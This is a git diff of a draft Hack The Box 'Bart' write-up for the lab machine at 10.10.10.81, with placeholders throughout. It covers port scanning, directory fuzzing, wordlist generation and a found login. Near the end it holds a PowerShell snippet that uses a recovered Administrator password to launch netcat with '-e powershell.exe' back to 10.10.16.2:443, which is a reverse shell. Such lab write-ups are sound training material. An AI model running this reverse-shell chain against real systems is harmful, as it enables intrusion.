@@ -7,14 +7,14 @@ tags: ["Hack The Box","OSCP"]
 {% assign imgDir="HTB-Bart-Writeup" %}
 
 # Introduction
-The hack the box machine "Bart" is a medium machine which is included in [TJnull's OSCP Preparation List](). Exploiting this machine requires knowledge in the areas of wordlist generation, log injection. This machine differs from other machines in the sense that is quite realistic.
+The hack the box machine "Bart" is a medium machine which is included in [TJnull's OSCP Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159). Exploiting this machine requires knowledge in the areas of wordlist generation, log injection. This machine differs from other machines in the sense that is quite realistic.
 
 <img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="HTBCard">
 
 By enumerating the target, it is possible to discover 
 
 # Exploitation
-We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.81`. The `-sS`, `-sC` and `-sV` flags instruct nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that there is only 
+We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.81`. The `-sS`, `-sC` and `-sV` flags instruct nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that there is a web server on port 80.
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[~]
@@ -38,7 +38,7 @@ Nmap done: 1 IP address (1 host up) scanned in 125.97 seconds
 └─$ 
 {% endhighlight %}
 
-If we try to navigate to [http://10.10.10.81](http://10.10.10.81) in a browser, we are redirected [http://forum.bart.htb](http://forum.bart.htb). However, our browser won't be able to find a host for this domain since it can not find any related DNS record which resolve to an IP address. 
+If we try to navigate to [http://10.10.10.81](http://10.10.10.81) in a browser, we are redirected [http://forum.bart.htb](http://forum.bart.htb). However, our browser won't be able to find a host for this domain since it can not find any related DNS record which resolves to an IP address. 
 
 ![forum.bart.htb](/assets/{{ imgDir }}/forum.bart.htb.png)
 
@@ -46,23 +46,128 @@ We can add the domain name `forum.bart.htb` to our `/etc/hosts` file and try aga
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
-└─$ echo '10.10.10.81\tforum.bart.htb\tbart.htb' | sudo tee -a /etc/hosts 
+└─$ @@echo '10.10.10.81\tforum.bart.htb\tbart.htb' | sudo tee -a /etc/hosts@@
 10.10.10.81     forum.bart.htb  bart.htb
                                                                                                                                                             
 ┌──(kali㉿kali)-[/tmp/x]
 └─$
 {% endhighlight %}
 
+
+{% highlight none linenos %}
+┌──(kali㉿kali)-[/tmp/x]
+└─$ ffuf -u http://bart.htb/FUZZ -ic -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt  
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://bart.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+login                   [Status: 200, Size: @@@158607@@@, Words: 663, Lines: 631]
+warez                   [Status: 200, Size: @@@158607@@@, Words: 663, Lines: 631]
+full                    [Status: 200, Size: @@@158607@@@, Words: 663, Lines: 631]
+download                [Status: 200, Size: @@@158607@@@, Words: 663, Lines: 631]
+rss                     [Status: 200, Size: @@@158607@@@, Words: 663, Lines: 631]
+cgi-bin                 [Status: 200, Size: @@@158607@@@, Words: 663, Lines: 631]
+blog                    [Status: 200, Size: @@@158607@@@, Words: 663, Lines: 631]
+12                      [Status: 200, Size: @@@158607@@@, Words: 663, Lines: 631]
+logo                    [Status: 200, Size: @@@158607@@@, Words: 663, Lines: 631]
+new                     [Status: 200, Size: @@@158607@@@, Words: 663, Lines: 631]
+                        [Status: 302, Size: 0, Words: 1, Lines: 1]
+10                      [Status: 200, Size: @@@158607@@@, Words: 663, Lines: 631]
+search                  [Status: 200, Size: @@@158607@@@, Words: 663, Lines: 631]
+news                    [Status: 200, Size: @@@158607@@@, Words: 663, Lines: 631]
+[WARN] Caught keyboard interrupt (Ctrl-C)
+{% endhighlight %}
+It goes really fast and we have to interrupt it. It appears that almost every request we send results in the same response. We can inspect this response by requesting [http://bart.htb/login](http://bart.htb/login) in a browser. Visiting this results in the custom `404 Not Found` page below.
+
+
+We can filter out this page by ignoring any responses which have 158607 bytes using the `-f` flag.
+
+{% highlight none linenos %}
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@ffuf -u http://bart.htb/FUZZ -ic -fs 158607 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt@@
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://bart.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response size: 158607
+________________________________________________
+
+                        [Status: 302, Size: 0, Words: 1, Lines: 1]
+forum                   [Status: 301, Size: 145, Words: 9, Lines: 2]
+monitor                 [Status: 301, Size: 147, Words: 9, Lines: 2]
+[WARN] Caught keyboard interrupt (Ctrl-C)
+{% endhighlight %}
+
+The results of the directory bruteforce suggests that there are two directories. The first is `/forum` which redirects to `/forum/` which is identical to `forum.bart.htb`. The second one is `/monitor` which redirects us to `monitor.bart.htb`. However, before we can access `monitor.bart.htb`, we must add it to our `/etc/hosts` file. We can use `sed` to delete the previous entry we created and then add a new entry with all the domain names we have discovered so far.
+
+{% highlight none linenos %}
+Placeholder
+{% endhighlight %}
+
+
+
+{% highlight none linenos %}
+Placeholder
+{% endhighlight %}
+
+
 ffuf -u http://bart.htb/FUZZ -ic -fs 158607 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt 
 We use -fs to filter out 404 pages
 
 We find /monitor
+
+We can generate a wordlist using [cewl]().
+
+{% highlight none linenos %}
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@cewl http://forum.bart.htb > wordlist@@
+                                                                                                                    
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@cat wordlist | wc -l@@
+@@@250@@@
+{% endhighlight %}
+
 
 we log in to /monitor with harvey:potter
 
 a redirect is performed to monitor.bart.htb
 
 We add monitor.bart.htb to our `/etc/hosts` file and reload the page
+
+sudo sed -i '/^10.10.10.81/d' /etc/hosts
+echo '10.10.10.81\tmonitor.bart.htb\tforum.bart.htb\tbart.htb' | sudo tee -a /etc/hosts 
 
 We log in again
 
@@ -119,44 +224,41 @@ DESKTOP-7I3S68E   Administrator   3130438f31186fbaf962f407711faddb
 
 Gives us "BART"
 
+{% highlight none linenos %}
+Placeholder
+{% endhighlight %}
+
+{% highlight none linenos %}
+Placeholder
+{% endhighlight %}
+
+{% highlight none linenos %}
+Placeholder
+{% endhighlight %}
+
+{% highlight none linenos %}
+Placeholder
+{% endhighlight %}
+
+{% highlight none linenos %}
+Placeholder
+{% endhighlight %}
+
+{% highlight none linenos %}
+Placeholder
+{% endhighlight %}
+
+{% highlight none linenos %}
+Placeholder
+{% endhighlight %}
+
+{% highlight none linenos %}
+Placeholder
+{% endhighlight %}
+
+# Privilege Escalation
+
 $secstr = New-Object -TypeName System.Security.SecureString
 "3130438f31186fbaf962f407711faddb".ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
 $creds = new-object -typename System.Management.Automation.PSCredential -argumentlist "BART\Administrator", $secstr
 Invoke-Command -ScriptBlock { C:\inetpub\wwwroot\internal-01\log\nc64.exe -e powershell.exe 10.10.16.2 443 } -Credential $creds -Computer localhost
-
-{% highlight none linenos %}
-Placeholder
-{% endhighlight %}
-
-{% highlight none linenos %}
-Placeholder
-{% endhighlight %}
-
-{% highlight none linenos %}
-Placeholder
-{% endhighlight %}
-
-{% highlight none linenos %}
-Placeholder
-{% endhighlight %}
-
-{% highlight none linenos %}
-Placeholder
-{% endhighlight %}
-
-{% highlight none linenos %}
-Placeholder
-{% endhighlight %}
-
-{% highlight none linenos %}
-Placeholder
-{% endhighlight %}
-
-{% highlight none linenos %}
-Placeholder
-{% endhighlight %}
-
-
-
-# Privilege Escalation
-
